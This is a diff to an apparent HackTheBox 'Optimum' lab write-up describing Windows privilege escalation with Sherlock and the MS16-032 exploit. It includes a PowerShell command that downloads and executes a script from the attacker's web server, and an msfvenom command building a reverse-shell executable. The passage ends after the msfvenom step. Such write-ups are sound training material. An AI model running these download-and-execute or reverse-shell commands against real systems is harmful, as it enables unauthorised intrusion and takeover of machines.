@@ -19,7 +19,7 @@ layout: default
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
         <li><a href="#kostas">Shell - kostas</a></li>
-        <li><a href="#root">Shell - root</a></li>
+        <li><a href="#root">Shell - nt authority\system</a></li>
     </ul>
 
     <h2><a id="summary">Summary</a></h2>
@@ -81,9 +81,44 @@ layout: default
     <br>
     <br>
 
-    <h2><a id="root">Shell - Root</a></h2>
+    <h2><a id="root">Shell - nt authority\system</a></h2>
 
-    <li>
+    <li>I begin the privilege escalation stage using winpeas, however that turns up nothing of interest.  Except for the fact that in the Watson section of the winpeas output nothing is populating, which is unusual.  So I begin to look for a kernel exploit.  There are 3 tools I use to search for kernel exploits.  Windows Exploit Suggest - Next Generation (wes-ng), Watson, and Sherlock.  wes-ng gives a lot of false positives so I attempt to use Watson or Sherlock instead.  Watson would not work using winpeas and I could not get it to work manually either.  I attempted to use a copy from the SharpCollection github repo.  So, I use Sherlock which is the old powershell script version of Watson.</li>
+
+    <br>
+
+    <li>I move Sherlock.ps1 to the same directory that I have a python web server running.  I also append "Find-AllVulns" to the bottom of Sherlock.ps1 so that the script executes that function immediately after loading.  Then I use the command: powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.83/Sherlock.ps1')" in order to download and execute Sherlock.ps1.</li>
+
+    <img src="../images/optimum/sherlock.png">
+
+    <br>
+    <br>
+    
+    <li>In the output from the Sherlock script we can see this machine "Appears Vulnerable" to MS16-032, MS16-034, and MS16-135.  MS16-034 did not have any precompiled exploits available so I put it on the backburner.  MS16-135 did not work using the exploit I found.  I ended up landing on MS16-032 using a working exploit from the searchsploit database.</li>
+
+    <img src="../images/optimum/searchsploit_ms16-032.png">
+
+    <br>
+    <br>
+
+    <li>I open up the exploit, 39719.ps1 and find the function used to execute the script is "Invoke-MS16-032" so I append this to the end of the script.  I do this so that when I use the powershell command on the victim machine to download and execute the powershell script, it will read the Invoke command immediately after and execute the exploit.  Now, I make sure this script is in the same directory that I have a python web server running (sudo python http.server 80).  Then I download and execute the script from the victim machine.</li>
+
+    <img src="../images/optimum/exploit_1.png">
+
+    <br>
+    <br>
+
+    <li>The output from the script says it worked successfuly and that we have a SYSTEM shell.  However, I check my shel using "whoami" and I see that I still have a shell as kostas, not SYSTEM.  After running the exploit a few more times, I get curious to see if it is creating a shell but not giving me access to it.  So, I use tasklist /V and I find that each time I run the exploit it is creating a cmd.exe process in the background with Administrator permissions.  The shell is being created, but I do not have access to it.  However, we apparently code execution as SYSTEM.</li>
+
+    <br>
+
+    <li>In order to gain a SYSTEM shell I modify the exploit.  First, I create a reverse shell executable using msfvenom</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Optimum]&#13;&#10;&boxur;&HorizontalLine;$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f exe &gt; shell.exe                                              130 &Cross;&#13;&#10;[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload&#13;&#10;[-] No arch selected, selecting arch: x86 from the payload&#13;&#10;No encoder specified, outputting raw payload&#13;&#10;Payload size: 324 bytes&#13;&#10;Final size of exe file: 73802 bytes&#13;&#10;    </pre>
+
+    
+
+
 
 </body>
 </html>
